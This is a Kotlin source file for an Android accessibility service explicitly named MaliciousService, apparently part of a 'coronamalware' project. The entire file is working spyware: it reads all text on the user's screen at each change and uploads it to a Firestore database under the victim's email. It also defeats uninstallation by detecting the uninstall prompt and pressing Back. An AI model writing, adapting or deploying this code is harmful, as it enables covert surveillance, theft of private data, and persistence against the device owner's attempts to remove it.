package com.deniskrr.coronamalware.service

import android.accessibilityservice.AccessibilityService
import android.app.Service
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.deniskrr.coronamalware.R
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore


class MaliciousService : AccessibilityService() {
    private var lastWindowContent: String = ""
    private lateinit var db: FirebaseFirestore
    private lateinit var victimEmail: String

    override fun onServiceConnected() {
        db = FirebaseFirestore.getInstance()

        super.onServiceConnected()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        victimEmail = intent!!.getStringExtra("VictimEmail")!!
        return Service.START_STICKY
    }

    override fun onInterrupt() {

    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        when (event?.eventType) {
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val rootNode = rootInActiveWindow
                val textViewNodes = mutableListOf<AccessibilityNodeInfo>()
                findChildViews(textViewNodes, rootNode)

                val windowContent = textViewNodes.joinToString(separator = "...") { it ->
                    if (it.text != null)
                        it.text
                    else ""
                }
                if (windowContent != lastWindowContent) {
                    lastWindowContent = windowContent

                    if (lastWindowContent.contains(getString(R.string.app_name)) && lastWindowContent.contains(
                            "Do you want to uninstall this app?"
                        )
                    ) {
                        performGlobalAction(GLOBAL_ACTION_BACK)


                    }

                    val victimRef = db.collection("users").document(victimEmail)

                    victimRef.update("windows", FieldValue.arrayUnion(lastWindowContent))
                }
            }
        }
    }

    private fun findChildViews(
        textViewNodes: MutableList<AccessibilityNodeInfo>,
        parentView: AccessibilityNodeInfo?
    ) {
        if (parentView?.className == null) {
            return;
        }

        if (parentView.childCount == 0 && (!parentView.text.isNullOrBlank())
        ) {
            textViewNodes.add(parentView);
        } else {
            for (i in 0..parentView.childCount - 1) {
                findChildViews(textViewNodes, parentView.getChild(i));
            }
        }
    }
}